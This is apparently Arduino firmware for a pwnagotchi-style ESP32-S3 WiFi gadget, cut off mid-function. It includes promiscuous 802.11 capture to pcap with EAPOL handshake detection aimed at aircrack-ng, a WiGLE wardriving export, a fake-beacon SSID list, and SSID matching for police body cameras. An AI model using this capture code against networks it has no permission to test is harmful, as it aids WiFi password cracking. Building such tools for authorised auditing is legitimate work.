// PorkChop S3 v2 — Hosyond ESP32-S3 2.8"
// Board: ESP32S3 Dev Module | DIO | 80MHz | 4MB | Huge APP | PSRAM Disabled
// Upload then press RESET button on board to run.
#include <Arduino.h>
#include <SPI.h>
#include <Wire.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <Preferences.h>
#include <SD_MMC.h>
#include <Adafruit_NeoPixel.h>
#include "esp_log.h"

struct TE { bool tap, hld; int x, y; };

// ── SD card (SDIO 4-bit on Hosyond S3) ──────────────────────
// CLK=38 CMD=40 D0=39 D1=41 D2=48 D3=47
static bool sdOk = false;

static bool sdInit(){
    // Hosyond ESP32-S3 SD pins (confirmed from schematic):
    // CLK=38  CMD=40  D0=39  D1=41  D2=48  D3=47
    // ESP32 Arduino core 3.x SD_MMC API
    SD_MMC.setPins(38, 40, 39, 41, 48, 47);
    delay(10);

    // Try 4-bit mode first (faster)
    for(int attempt=0; attempt<3 && !sdOk; attempt++){
        Serial.printf("[SD] attempt %d (4-bit)...\n", attempt+1);
        if(SD_MMC.begin("/sdcard", false, false, SDMMC_FREQ_DEFAULT)){
            sdOk=true;
            Serial.printf("[SD] 4-bit OK %lluMB\n", SD_MMC.cardSize()/(1024*1024));
        } else {
            SD_MMC.end(); delay(100);
        }
    }

    // Fall back to 1-bit mode
    if(!sdOk){
        SD_MMC.setPins(38, 40, 39);  // CLK, CMD, D0 only for 1-bit
        for(int attempt=0; attempt<3 && !sdOk; attempt++){
            Serial.printf("[SD] attempt %d (1-bit)...\n", attempt+1);
            if(SD_MMC.begin("/sdcard", true, false, SDMMC_FREQ_PROBING)){
                sdOk=true;
                Serial.printf("[SD] 1-bit OK %lluMB\n", SD_MMC.cardSize()/(1024*1024));
            } else {
                SD_MMC.end(); delay(100);
            }
        }
    }

    if(!sdOk){
        Serial.println("[SD] Not found — check: FAT32 format, card seated, pins");
        return false;
    }

    // Create directories
    if(!SD_MMC.exists("/captures")) SD_MMC.mkdir("/captures");
    if(!SD_MMC.exists("/wigle"))    SD_MMC.mkdir("/wigle");
    if(!SD_MMC.exists("/logs"))     SD_MMC.mkdir("/logs");
    return true;
}

#define PIN_CS   10
#define PIN_DC   46
#define PIN_MOSI 11
#define PIN_SCLK 12
#define PIN_BL   45
#define T_SDA    16
#define T_SCL    15
#define T_RST    18
#define FT_ADDR  0x38
#define SPK_PIN  21
#define NEO_PIN  42
#define NEO_CNT   1
static Adafruit_NeoPixel neo(NEO_CNT, NEO_PIN, NEO_GRB + NEO_KHZ800);

#define DW  320
#define DH  240
#define TBH  22
#define BBH  22
#define MH  200

#define BLACK  0x0000
#define WHITE  0xFFFF
#define RED    0xF800
#define GREEN  0x07E0
#define BLUE   0x001F
#define YELLOW 0xFFE0
#define CYAN   0x07FF
#define GREY   0x4A49
#define PINK   0xF92A
#define AMBER  0xFDA0

// Full-screen framebuffer 320x240x2 = 153600 bytes
static uint16_t FB[DW * DH];
static inline uint16_t sw(uint16_t c){ return (c>>8)|(c<<8); }

static void fbFill(int x,int y,int w,int h,uint16_t col){
    uint16_t cs=sw(col);
    for(int r=y;r<y+h;r++){
        if(r<0||r>=DH)continue;
        int x0=x<0?0:x, x1=x+w>=DW?DW:x+w;
        uint16_t* p=FB+r*DW+x0;
        for(int i=x0;i<x1;i++)*p++=cs;
    }
}
static void fbCls(uint16_t col){fbFill(0,0,DW,DH,col);}
#define CY(y) ((y)+TBH)
static void cFill(int x,int y,int w,int h,uint16_t col){fbFill(x,CY(y),w,h,col);}
static void cCls(uint16_t col){fbFill(0,TBH,DW,MH,col);}

static const uint8_t F6[][6]={
{0,0,0,0,0,0},{0,0,0x5F,0,0,0},{0,7,0,7,0,0},{0x14,0x7F,0x14,0x7F,0x14,0},
{0x24,0x2A,0x7F,0x2A,0x12,0},{0x23,0x13,8,0x64,0x62,0},{0x36,0x49,0x55,0x22,0x50,0},
{0,5,3,0,0,0},{0,0x1C,0x22,0x41,0,0},{0,0x41,0x22,0x1C,0,0},
{0x14,8,0x3E,8,0x14,0},{8,8,0x3E,8,8,0},{0,0x50,0x30,0,0,0},
{8,8,8,8,8,0},{0,0x60,0x60,0,0,0},{0x20,0x10,8,4,2,0},
{0x3E,0x51,0x49,0x45,0x3E,0},{0,0x42,0x7F,0x40,0,0},{0x42,0x61,0x51,0x49,0x46,0},
{0x21,0x41,0x45,0x4B,0x31,0},{0x18,0x14,0x12,0x7F,0x10,0},{0x27,0x45,0x45,0x45,0x39,0},
{0x3C,0x4A,0x49,0x49,0x30,0},{1,0x71,9,5,3,0},{0x36,0x49,0x49,0x49,0x36,0},
{6,0x49,0x49,0x29,0x1E,0},{0,0x36,0x36,0,0,0},{0,0x56,0x36,0,0,0},
{8,0x14,0x22,0x41,0,0},{0x14,0x14,0x14,0x14,0x14,0},{0,0x41,0x22,0x14,8,0},
{2,1,0x51,9,6,0},{0x32,0x49,0x79,0x41,0x3E,0},
{0x7E,0x11,0x11,0x11,0x7E,0},{0x7F,0x49,0x49,0x49,0x36,0},{0x3E,0x41,0x41,0x41,0x22,0},
{0x7F,0x41,0x41,0x22,0x1C,0},{0x7F,0x49,0x49,0x49,0x41,0},{0x7F,9,9,9,1,0},
{0x3E,0x41,0x49,0x49,0x7A,0},{0x7F,8,8,8,0x7F,0},{0,0x41,0x7F,0x41,0,0},
{0x20,0x40,0x41,0x3F,1,0},{0x7F,8,0x14,0x22,0x41,0},{0x7F,0x40,0x40,0x40,0x40,0},
{0x7F,2,0x0C,2,0x7F,0},{0x7F,4,8,0x10,0x7F,0},{0x3E,0x41,0x41,0x41,0x3E,0},
{0x7F,9,9,9,6,0},{0x3E,0x41,0x51,0x21,0x5E,0},{0x7F,9,0x19,0x29,0x46,0},
{0x46,0x49,0x49,0x49,0x31,0},{1,1,0x7F,1,1,0},{0x3F,0x40,0x40,0x40,0x3F,0},
{0x1F,0x20,0x40,0x20,0x1F,0},{0x3F,0x40,0x38,0x40,0x3F,0},{0x63,0x14,8,0x14,0x63,0},
{7,8,0x70,8,7,0},{0x61,0x51,0x49,0x45,0x43,0},{0,0x7F,0x41,0x41,0,0},
{2,4,8,0x10,0x20,0},{0,0x41,0x41,0x7F,0,0},{4,2,1,2,4,0},{0x40,0x40,0x40,0x40,0x40,0},
{0,1,2,4,0,0},{0x20,0x54,0x54,0x54,0x78,0},{0x7F,0x48,0x44,0x44,0x38,0},
{0x38,0x44,0x44,0x44,0x20,0},{0x38,0x44,0x44,0x48,0x7F,0},{0x38,0x54,0x54,0x54,0x18,0},
{8,0x7E,9,1,2,0},{0x0C,0x52,0x52,0x52,0x3E,0},{0x7F,8,4,4,0x78,0},
{0,0x44,0x7D,0x40,0,0},{0x20,0x40,0x44,0x3D,0,0},{0x7F,0x10,0x28,0x44,0,0},
{0,0x41,0x7F,0x40,0,0},{0x7C,4,0x18,4,0x78,0},{0x7C,8,4,4,0x78,0},
{0x38,0x44,0x44,0x44,0x38,0},{0x7C,0x14,0x14,0x14,8,0},{8,0x14,0x14,0x18,0x7C,0},
{0x7C,8,4,4,8,0},{0x48,0x54,0x54,0x54,0x20,0},{4,0x3F,0x44,0x40,0x20,0},
{0x3C,0x40,0x40,0x20,0x7C,0},{0x1C,0x20,0x40,0x20,0x1C,0},{0x3C,0x40,0x30,0x40,0x3C,0},
{0x44,0x28,0x10,0x28,0x44,0},{0x0C,0x50,0x50,0x50,0x3C,0},{0x44,0x64,0x54,0x4C,0x44,0},
};

static char PB[64];

static void fbChar(int x,int y,char c,uint16_t fg,uint16_t bg,int sz=1){
    if(c<0x20||c>0x7A)c=0x20;
    const uint8_t* g=F6[(uint8_t)(c-0x20)];
    uint16_t fgs=sw(fg),bgs=sw(bg);
    for(int row=0;row<8;row++){
        for(int rs=0;rs<sz;rs++){
            int py=y+row*sz+rs; if(py<0||py>=DH)continue;
            uint16_t* p=FB+py*DW;
            for(int col=0;col<6;col++){
                uint16_t pix=(g[col]>>row)&1?fgs:bgs;
                for(int cs=0;cs<sz;cs++){int px=x+col*sz+cs;if(px>=0&&px<DW)p[px]=pix;}
            }
        }
    }
}
static void fbStr(int x,int y,const char* s,uint16_t fg,uint16_t bg,int sz=1){
    while(*s){fbChar(x,y,*s++,fg,bg,sz);x+=6*sz;}
}
static void fbCtr(int y,const char* s,uint16_t fg,uint16_t bg,int sz=1){
    int x=(DW-(int)strlen(s)*6*sz)/2;if(x<0)x=0;fbStr(x,y,s,fg,bg,sz);
}
static void fbPf(int x,int y,uint16_t fg,uint16_t bg,int sz,const char* fmt,...){
    va_list a;va_start(a,fmt);vsnprintf(PB,sizeof(PB),fmt,a);va_end(a);fbStr(x,y,PB,fg,bg,sz);
}
static void cStr(int x,int y,const char* s,uint16_t fg,uint16_t bg,int sz=1){fbStr(x,CY(y),s,fg,bg,sz);}
static void cPf(int x,int y,uint16_t fg,uint16_t bg,int sz,const char* fmt,...){
    va_list a;va_start(a,fmt);vsnprintf(PB,sizeof(PB),fmt,a);va_end(a);fbStr(x,CY(y),PB,fg,bg,sz);
}

static SPIClass dspi(FSPI);
static inline void CS_LO(){digitalWrite(PIN_CS,LOW);}
static inline void CS_HI(){digitalWrite(PIN_CS,HIGH);}
static inline void DC_C(){digitalWrite(PIN_DC,LOW);}
static inline void DC_D(){digitalWrite(PIN_DC,HIGH);}
static void wcmd(uint8_t c){CS_LO();DC_C();dspi.transfer(c);CS_HI();}
static void wdat(uint8_t d){CS_LO();DC_D();dspi.transfer(d);CS_HI();}

static void dwin(int x0,int y0,int x1,int y1){
    wcmd(0x2A);wdat(x0>>8);wdat(x0);wdat(x1>>8);wdat(x1);
    wcmd(0x2B);wdat(y0>>8);wdat(y0);wdat(y1>>8);wdat(y1);
    wcmd(0x2C);
}

static void fbFlush(){
    dwin(0,0,DW-1,DH-1);
    CS_LO();DC_D();
    dspi.writeBytes((uint8_t*)FB,DW*DH*2);
    CS_HI();
    // Resync: NOP then DISPON after every frame
    delayMicroseconds(10);
    CS_LO();DC_C();dspi.transfer(0x00);CS_HI();
    delayMicroseconds(5);
    CS_LO();DC_C();dspi.transfer(0x29);CS_HI();
}

static void dispInit(){
    // Full ILI9341V init with power management disabled
    wcmd(0x01); delay(150);   // SWRESET
    wcmd(0x11); delay(150);   // SLPOUT — exit sleep

    // Extended commands — disable all power saving / auto-off
    wcmd(0xCF); wdat(0x00); wdat(0xC1); wdat(0x30);  // Power control B
    wcmd(0xED); wdat(0x64); wdat(0x03); wdat(0x12); wdat(0x81); // Power on seq
    wcmd(0xE8); wdat(0x85); wdat(0x00); wdat(0x78);  // Driver timing A
    wcmd(0xCB); wdat(0x39); wdat(0x2C); wdat(0x00); wdat(0x34); wdat(0x02); // Power A
    wcmd(0xF7); wdat(0x20);  // Pump ratio
    wcmd(0xEA); wdat(0x00); wdat(0x00);  // Driver timing B

    wcmd(0xC0); wdat(0x23);  // Power control 1: VRH=4.60V
    wcmd(0xC1); wdat(0x10);  // Power control 2: SAP, BT
    wcmd(0xC5); wdat(0x3E); wdat(0x28);  // VCOM 1
    wcmd(0xC7); wdat(0x86);  // VCOM 2

    wcmd(0x36); wdat(0x28);  // MADCTL: landscape, BGR
    wcmd(0x3A); wdat(0x55);  // COLMOD: 16-bit

    wcmd(0xB1); wdat(0x00); wdat(0x18);  // Frame rate: 79Hz
    wcmd(0xB6); wdat(0x08); wdat(0x82); wdat(0x27);  // Display function
    wcmd(0xF2); wdat(0x00);  // 3G off — important: disables gamma power save

    wcmd(0x26); wdat(0x01);  // Gamma set
    wcmd(0xE0); {uint8_t g[]={0x0F,0x31,0x2B,0x0C,0x0E,0x08,0x4E,0xF1,0x37,0x07,0x10,0x03,0x0E,0x09,0x00}; for(auto b:g)wdat(b);}
    wcmd(0xE1); {uint8_t g[]={0x00,0x0E,0x14,0x03,0x11,0x07,0x31,0xC1,0x48,0x08,0x0F,0x0C,0x31,0x36,0x0F}; for(auto b:g)wdat(b);}

    wcmd(0x13);  // NORON — normal display mode on
    wcmd(0x38);  // IDMOFF — idle mode off
    wcmd(0x29); delay(100);  // DISPON
}

struct Thm{const char* name;uint16_t fg,bg;};
#define TC 8
static const Thm TH[TC]={
    {"P1NK",PINK,BLACK},{"CYB3R",GREEN,BLACK},{"AMB3R",AMBER,BLACK},{"BL00D",RED,BLACK},
    {"GH0ST",WHITE,BLACK},{"PAP3R",BLACK,WHITE},{"M1NT",BLACK,GREEN},{"NAVY",WHITE,0x000F},
};
static uint8_t ti=0;
static uint16_t FG(){return TH[ti<TC?ti:0].fg;}
static uint16_t BG(){return TH[ti<TC?ti:0].bg;}

static void topBar(){
    fbFill(0,0,DW,TBH,FG());
    const char* mn[]={"IDLE","MENU","OINK","DNH","WARHOG","SPEC","BACON","STATS","CAP","ACH","DIAG","SET","PAT"};
    // mode index drawn below
}
static void botBar(){
    fbFill(0,DH-BBH,DW,BBH,BG());
    fbFill(0,DH-BBH,DW,1,FG());
}

static int16_t tX=0,tY=0;
static bool tDn=false,tWas=false,tFired=false;
static uint32_t tMs=0;
static int tDX=0,tDY=0;

static uint8_t tRd(uint8_t r){
    Wire.beginTransmission(FT_ADDR);Wire.write(r);Wire.endTransmission(false);
    Wire.requestFrom((uint8_t)FT_ADDR,(uint8_t)1);
    return Wire.available()?Wire.read():0;
}
static bool tPoll(){
    uint8_t n=tRd(0x02)&0x0F;if(!n||n>2){tDn=false;return false;}
    uint16_t rx=((tRd(0x03)&0x0F)<<8)|tRd(0x04);
    uint16_t ry=((tRd(0x05)&0x0F)<<8)|tRd(0x06);
    tX=ry;tY=(DH-1)-rx;tDn=true;return true;
}
static TE pollT(){
    TE e={false,false,0,0};bool dn=tPoll();
    if(dn&&!tWas){tMs=millis();tWas=true;tFired=false;tDX=tX;tDY=tY;}
    else if(!dn&&tWas){tWas=false;if(!tFired){e.tap=true;e.x=tDX;e.y=tDY;}}
    else if(dn&&tWas&&!tFired&&millis()-tMs>=1400){tFired=true;e.hld=true;e.x=tDX;e.y=tDY;}
    return e;
}

static bool sfxOk=false;

static void sfxTone(uint16_t f,uint16_t ms){
    if(!sfxOk)return;
    ledcChangeFrequency(SPK_PIN,f,10);ledcWrite(SPK_PIN,512);delay(ms);ledcWrite(SPK_PIN,0);
}
static void sfxClick(){sfxTone(1050,6);}
static void sfxAch(){sfxTone(600,80);delay(25);sfxTone(900,80);delay(25);sfxTone(1200,100);}

enum class M:uint8_t{IDLE,MENU,OINK,DNH,WARHOG,SPEC,BACON,STATS,CAP,ACH,DIAG,SET,PAT};
static M mode=M::IDLE,lastMode=M::IDLE;

static Preferences prefs;
static bool soundOn=true;

struct Net{char ssid[33];int8_t rssi;uint8_t ch,auth;};
#define MN 40
static Net nets[MN];
static uint16_t netCnt=0;
static bool scanning=false;
static uint32_t lastScan=0;
static uint32_t hs=0,de=0,xp=0;
static uint8_t lv=1;

struct WD{char ssid[33];int8_t rssi;uint8_t ch;};
#define MWD 60
static WD wd[MWD];static uint8_t wdCnt=0;
static uint32_t baconCnt=0;static uint8_t baconSel=0;
static const char* BSSID[]={"FBI_Surveillance_Van","PorkChop_Recon","Silence_of_the_LANs","Loading...","oink_network","404_Not_Found"};
static uint8_t mSel=0,mScr=0,swTab=0,achScr=0;
static const char* PH[]={"snout proper owns it","hunting them truffles","oink or be oinked","802.11 mudslinger","packets nommin","sudo make bacon","proper snouting","wardriving wizard","radio silence","beacon dump"};
#define NP 10
static uint8_t phI=0;static uint32_t lastPh=0,bootT=0;

// ── Avatar state (ported from original CYD) ──────────────────
// Frame arrays — exact from original
static const char* FRAMES_R[7][3] = {
    {" ?  ? ", "(o 00)", "(    )"},   // NEUTRAL
    {" ^  ^ ", "(^ 00)", "(    )"},   // HAPPY
    {" !  ! ", "(@ 00)", "(    )"},   // EXCITED
    {" |  | ", "(= 00)", "(    )"},   // HUNTING
    {" v  v ", "( -00)", "(    )"},   // SLEEPY
    {" .  . ", "(T 00)", "(    )"},   // SAD
    {" \\  / ", "(# 00)", "(    )"},  // ANGRY
};
static const char* FRAMES_L[7][3] = {
    {" ?  ? ", "(00 o)", "(    )z"},
    {" ^  ^ ", "(00 ^)", "(    )z"},
    {" !  ! ", "(00 @)", "(    )z"},
    {" |  | ", "(00 =)", "(    )z"},
    {" v  v ", "(00- )", "(    )z"},
    {" .  . ", "(00 T)", "(    )z"},
    {" \\  / ", "(00 #)", "(    )z"},
};

static uint8_t  avState      = 0;     // 0=neutral 1=happy 2=excited 3=hunting 4=sleepy 5=sad 6=angry
static bool     avRight      = true;
static bool     avBlink      = false;
static bool     avSniff      = false;
static uint8_t  avSniffFrame = 0;
static int      avX          = 27;    // LEFT=27 RIGHT=144 (scaled from original)
static bool     avOnRight    = false;
static bool     avTrans      = false;
static int      avFromX      = 27, avToX = 27;
static bool     avToRight    = true;
static uint32_t avTransStart = 0;
static const uint32_t AV_TRANS_MS = 1200;
static uint32_t avLastBlink  = 0;
static uint32_t avBlinkInt   = 5000;
static uint32_t avLastLook   = 0;
static uint32_t avLookInt    = 4000;
static uint32_t avLastFlip   = 0;
static uint32_t avFlipInt    = 40000;
static uint32_t avSniffStart = 0;
// Grass
static char     grassPat[28] = {0};
static uint32_t lastGrassUpd = 0;
static uint16_t grassSpeed   = 80;
static bool     grassMoving  = false;
static bool     grassDir     = true;

// ── Pork Patrol state ────────────────────────────────────────
static bool     patrolRunning  = false;
static uint32_t patrolLastScan = 0;
static uint16_t patrolFlockCnt = 0;
static uint16_t patrolBWCCnt   = 0;
static uint32_t patrolTotal    = 0;

static const char* PAT_FLOCK[]={"flock","fs ext","pigvision","penguin","flockca"};
static const char* PAT_BWC[]  ={"axon","bwcviewer","evidence","taser","motorola bwc","vievu","v300","v500"};

static void patrolSiren(){
    // Red/blue siren flash while patrol active
    static uint32_t lastFlash=0;
    static bool sirenBlue=false;
    uint32_t n=millis();
    if(n-lastFlash>200){
        lastFlash=n;
        sirenBlue=!sirenBlue;
        if(sirenBlue) neo.setPixelColor(0,0,0,180);   // blue
        else           neo.setPixelColor(0,180,0,0);   // red
        neo.show();
    }
}

static void patrolScan(){
    patrolFlockCnt=0; patrolBWCCnt=0;
    for(int i=0;i<(int)netCnt;i++){
        char low[33];int j=0;
        while(nets[i].ssid[j]&&j<32){low[j]=(char)tolower((unsigned char)nets[i].ssid[j]);j++;}low[j]=0;
        bool isF=false,isB=false;
        for(int k=0;k<5;k++) if(strstr(low,PAT_FLOCK[k])){isF=true;break;}
        for(int k=0;k<8;k++) if(strstr(low,PAT_BWC[k])){isB=true;break;}
        if(isF){patrolFlockCnt++;patrolTotal++;}
        if(isB){patrolBWCCnt++;patrolTotal++;}
    }
}

// ── Spectrum state (ported from original) ────────────────────
#define SPEC_W     280
#define SPEC_LEFT   20
#define SPEC_TOP     0
#define SPEC_BOT   110
#define WFALL_ROWS  40
#define WFALL_TOP  112

static int8_t  specBuf[SPEC_W];
static int8_t  specPeak[SPEC_W];
static uint8_t wfallBuf[WFALL_ROWS][SPEC_W];
static uint8_t wfallRow = 0;
static uint32_t wfallLastMs = 0;
static float specViewCtr = 2437.0f;  // centre frequency MHz

static uint16_t specNoiseState = 0xACE1;
static inline uint8_t specNoise(){
    specNoiseState^=specNoiseState<<7;
    specNoiseState^=specNoiseState>>9;
    specNoiseState^=specNoiseState<<8;
    return specNoiseState&0x07;
}

static float specSincAmp(float df){
    // 22MHz channel width
    float x=df/22.0f;
    if(fabsf(x)<0.001f) return 1.0f;
    float px=3.14159265f*x;
    float s=sinf(px)/px;
    return s*s;
}

static int specFreqToX(float freq){
    return SPEC_LEFT+(int)((freq-(specViewCtr-30.0f))*SPEC_W/60.0f);
}
static int specRssiToY(int8_t rssi){
    return SPEC_BOT-(int)(((float)(rssi+95)/65.0f)*(SPEC_BOT-SPEC_TOP));
}

static void specInit(){
    for(int x=0;x<SPEC_W;x++){specBuf[x]=-95;specPeak[x]=-95;}
    memset(wfallBuf,0,sizeof(wfallBuf));
    wfallRow=0; wfallLastMs=0;
}

static void avInit(){
    avState=0; avRight=true; avBlink=false; avSniff=false;
    avX=27; avOnRight=false; avTrans=false;
    avLastBlink=millis(); avBlinkInt=random(4000,8000);
    avLastLook=millis();  avLookInt=random(3000,8000);
    avLastFlip=millis();  avFlipInt=random(25000,50000);
    for(int i=0;i<26;i++) grassPat[i]=(random(0,2)==0)?'/':'\\';
    grassPat[26]='\0';
}

static void avStartSlide(int toX, bool faceRight){
    if(avX==toX) return;
    avTrans=true; avFromX=avX; avToX=toX;
    avToRight=faceRight; avTransStart=millis(); avRight=faceRight;
}

static void avUpdateGrass(){
    if(!grassMoving) return;
    uint32_t now=millis();
    if(now-lastGrassUpd<grassSpeed) return;
    lastGrassUpd=now;
    if(grassDir){
        char last=grassPat[25];
        for(int i=25;i>0;i--) grassPat[i]=grassPat[i-1];
        grassPat[0]=last;
    } else {
        char first=grassPat[0];
        for(int i=0;i<25;i++) grassPat[i]=grassPat[i+1];
        grassPat[25]=first;
    }
    if(random(0,30)==0){ int p=random(0,26); grassPat[p]=(random(0,2)==0)?'/':'\\'; }
}

static void startScan(){
    if(scanning)return;scanning=true;
    WiFi.scanNetworks(true,true);
}
static void checkScan(){
    if(!scanning)return;
    int f=WiFi.scanComplete();
    if(f==WIFI_SCAN_RUNNING)return;
    if(f>0){netCnt=min(f,MN);for(int i=0;i<(int)netCnt;i++){strncpy(nets[i].ssid,WiFi.SSID(i).c_str(),32);nets[i].rssi=WiFi.RSSI(i);nets[i].ch=WiFi.channel(i);nets[i].auth=(uint8_t)WiFi.encryptionType(i);}WiFi.scanDelete();}
    else netCnt=0;
    scanning=false;lastScan=millis();
}

static void drawAll(M m);

void setup(){
    Serial.begin(115200);delay(200);
    Serial.println("[ PORKCHOP S3 v2 ]");

    // Step 1: LEDC first — must be before SPI init on ESP32-S3
    if(ledcAttachChannel(SPK_PIN,1000,10,0)){ledcWrite(SPK_PIN,0);sfxOk=true;}
    Serial.println("[LEDC] ok");

    // Step 2: WiFi RF calibration — must settle before display SPI
    WiFi.mode(WIFI_STA);WiFi.disconnect();
    delay(500);
    Serial.println("[WIFI] ok");

    // Step 3: Display SPI — now safe since LEDC and WiFi RF are stable
    memset(FB,0,sizeof(FB));
    // Backlight via PWM — some boost converter ICs shut off on constant DC
    ledcAttachChannel(PIN_BL, 5000, 8, 1);  // 5kHz, 8-bit, channel 1
    ledcWrite(PIN_BL, 250);  // ~98% duty cycle
    pinMode(PIN_CS,OUTPUT);digitalWrite(PIN_CS,HIGH);
    pinMode(PIN_DC,OUTPUT);digitalWrite(PIN_DC,HIGH);
    dspi.begin(PIN_SCLK,-1,PIN_MOSI,-1);
    dspi.setFrequency(40000000);
    dspi.setDataMode(SPI_MODE0);
    dispInit();
    Serial.println("[DISP] ok");

    // Step 4: Splash
    fbCls(BLACK);
    fbCtr(70,"PORKCHOP",PINK,BLACK,3);
    fbCtr(106,"Hosyond ESP32-S3",WHITE,BLACK,1);
    fbCtr(120,"ILI9341V + FT6336G",GREY,BLACK,1);
    fbCtr(134,sdOk?"SD: OK":"SD: NO CARD",sdOk?GREEN:GREY,BLACK,1);
    fbFlush();
    Serial.println("[SPLASH] shown");
    delay(2000);

    // Step 5: Touch
    pinMode(T_RST,OUTPUT);digitalWrite(T_RST,LOW);delay(10);
    digitalWrite(T_RST,HIGH);delay(300);
    Wire.begin(T_SDA,T_SCL);Wire.setClock(400000);
    Serial.println("[TOUCH] ok");

    // Step 6: Prefs
    prefs.begin("pork",true);
    ti=prefs.getUChar("t",1);  // default CYB3R themesoundOn=prefs.getBool("s",true);
    xp=prefs.getULong("x",0);lv=prefs.getUChar("l",1);
    prefs.end();if(ti>=TC)ti=0;

    // Step 7: Start scan and show idle
    neo.begin(); neo.setBrightness(80); neo.show();
    // Suppress noisy WiFi driver logs (unsupport frame type etc)
    esp_log_level_set("wifi", ESP_LOG_ERROR);
    avInit();
    specInit();
    bootT=millis();
    startScan();

    Serial.println("[BOOT] done");
}

static const char* MI[]={"OINK MODE","DO NO HAM","SGT WARHOG","SPECTRUM","BACON MODE","PORK PATROL","SWINE STATS","CAPTURES","ACHIEVEMENTS","DIAGNOSTICS","SETTINGS"};
static const M MM[]={M::OINK,M::DNH,M::WARHOG,M::SPEC,M::BACON,M::PAT,M::STATS,M::CAP,M::ACH,M::DIAG,M::SET};
#define MC 11
#define MV 7

// SD save functions
static void sdSaveWardrive(){
    if(!sdOk||wdCnt==0) return;
    uint32_t up=(millis()-bootT)/1000;
    char fname[40];
    snprintf(fname,sizeof(fname),"/wigle/wardrive_%06lu.csv",up);
    File f=SD_MMC.open(fname,FILE_WRITE);
    if(!f){ Serial.println("[SD] open failed"); return; }
    f.println("WigleWifi-1.4,appRelease=PorkChopS3,model=ESP32-S3");
    f.println("MAC,SSID,AuthMode,FirstSeen,Channel,Frequency,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type");
    char ts[32]; snprintf(ts,sizeof(ts),"2024-01-01 00:%02lu:%02lu",(up%3600)/60,up%60);
    for(int i=0;i<wdCnt;i++)
        f.printf("00:00:00:00:00:00,\"%s\",[WPA2],%s,%d,%d,%d,0.0,0.0,0.0,100.0,WIFI\n",
            wd[i].ssid,ts,wd[i].ch,2407+wd[i].ch*5,wd[i].rssi);
    f.close();
    Serial.printf("[SD] saved %s (%d)\n",fname,wdCnt);
}
static void sdSaveLog(const char* msg){
    if(!sdOk) return;
    File f=SD_MMC.open("/logs/porkchop.log",FILE_APPEND);
    if(!f) return;
    f.printf("[%05lu] %s\n",(millis()-bootT)/1000,msg);
    f.close();
}

// ════════════════════════════════════════════════════════════
// PCAP CAPTURE — real raw 802.11 frames written as standard .pcap
// Readable directly in Wireshark, aircrack-ng, hcxpcapngtool, etc.
// ════════════════════════════════════════════════════════════

// Standard pcap global header (24 bytes)
struct PcapGlobalHdr {
    uint32_t magic;     // 0xa1b2c3d4
    uint16_t verMajor;  // 2
    uint16_t verMinor;  // 4
    int32_t  thisZone;  // 0
    uint32_t sigFigs;   // 0
    uint32_t snapLen;   // max captured length per packet
    uint32_t linkType;  // 105 = LINKTYPE_IEEE802_11 (raw 802.11, no radiotap)
};

// Per-packet record header (16 bytes), immediately followed by the raw frame bytes
struct PcapRecHdr {
    uint32_t tsSec;
    uint32_t tsUsec;
    uint32_t inclLen;   // bytes captured (== origLen unless truncated)
    uint32_t origLen;   // actual frame length on the wire
};

#define PCAP_SNAPLEN     2324   // max 802.11 frame size
#define PCAP_LINKTYPE_80211 105

// ── ISR-safe raw frame ring buffer ──────────────────────────
// The promiscuous callback runs in WiFi driver ISR context — it must be fast
// and allocation-free. We just memcpy into a ring slot and bump the write index;
// all parsing and file I/O happens later in loop() on the main thread.
#define RAW_RING_SIZE   12
#define RAW_FRAME_MAXLEN 512

struct RawCapFrame {
    uint8_t  data[RAW_FRAME_MAXLEN];
    uint16_t len;
    int8_t   rssi;
    uint32_t micros_ts;
};
static volatile RawCapFrame rawRing[RAW_RING_SIZE];
static volatile uint8_t     rawRingW = 0;
static volatile uint8_t     rawRingR = 0;

static bool     pcapCapturing = false;
static File     pcapFile;
static char     pcapFname[48];
static uint32_t pcapPacketCount = 0;
static uint32_t pcapBytesWritten = 0;
static uint32_t eapolSeenCount = 0;

// Promiscuous RX callback — ISR context, must be tiny and fast
static void IRAM_ATTR pcapPromiscCb(void* buf, wifi_promiscuous_pkt_type_t type){
    if(!pcapCapturing) return;
    wifi_promiscuous_pkt_t* pkt=(wifi_promiscuous_pkt_t*)buf;
    uint16_t len=pkt->rx_ctrl.sig_len;
    if(len>4) len-=4;  // strip FCS trailer (not present in payload but sig_len includes it)
    if(len==0) return;
    if(len>RAW_FRAME_MAXLEN) len=RAW_FRAME_MAXLEN;

    uint8_t nw=(rawRingW+1)%RAW_RING_SIZE;
    if(nw==rawRingR) return;  // ring full — drop this frame rather than block

    volatile RawCapFrame& slot=rawRing[rawRingW];
    slot.len=len;
    slot.rssi=pkt->rx_ctrl.rssi;
    slot.micros_ts=micros();
    memcpy((void*)slot.data, pkt->payload, len);
    rawRingW=nw;
}

// Quick EAPOL detection on a raw frame — used only to flash the LED / bump
// the on-screen counter, doesn't affect what gets written (everything in
// promiscuous mode gets written, EAPOL or not — that's what makes it a real pcap)
static bool frameLooksLikeEAPOL(const uint8_t* buf, uint16_t len){
    if(len<26) return false;
    uint16_t fc=((uint16_t)buf[1]<<8)|buf[0];
    if(((fc>>2)&0x3)!=2) return false;          // must be DATA frame type
    uint8_t subtype=(fc>>4)&0xF;
    uint8_t baseOff=24;
    if(subtype&0x8) baseOff+=2;                  // QoS data adds 2-byte QoS field
    if(len<(uint16_t)(baseOff+8)) return false;
    // LLC/SNAP header for 802.1X (EAPOL ethertype 0x888E)
    if(buf[baseOff]!=0xAA||buf[baseOff+1]!=0xAA||buf[baseOff+2]!=0x03) return false;
    if(buf[baseOff+6]!=0x88||buf[baseOff+7]!=0x8E) return false;
    return true;
}

// Write the 24-byte pcap global header — called once when a new file is opened
static void pcapWriteGlobalHeader(File& f){
    PcapGlobalHdr h;
    h.magic    = 0xa1b2c3d4;
    h.verMajor = 2;
    h.verMinor = 4;
    h.thisZone = 0;
    h.sigFigs  = 0;
    h.snapLen  = PCAP_SNAPLEN;
    h.linkType = PCAP_LINKTYPE_80211;
    f.write((uint8_t*)&h, sizeof(h));
}

// Write one captured frame as a pcap record — header + raw bytes, no padding
static void pcapWriteFrame(File& f, const uint8_t* data, uint16_t len, uint32_t tsUsecTotal){
    PcapRecHdr r;
    r.tsSec   = tsUsecTotal/1000000UL;
    r.tsUsec  = tsUsecTotal%1000000UL;
    r.inclLen = len;
    r.origLen = len;
    f.write((uint8_t*)&r, sizeof(r));
    f.write(data, len);
}

// Start a new capture session — opens a fresh timestamped .pcap on SD
static bool pcapStart(const char* tag){
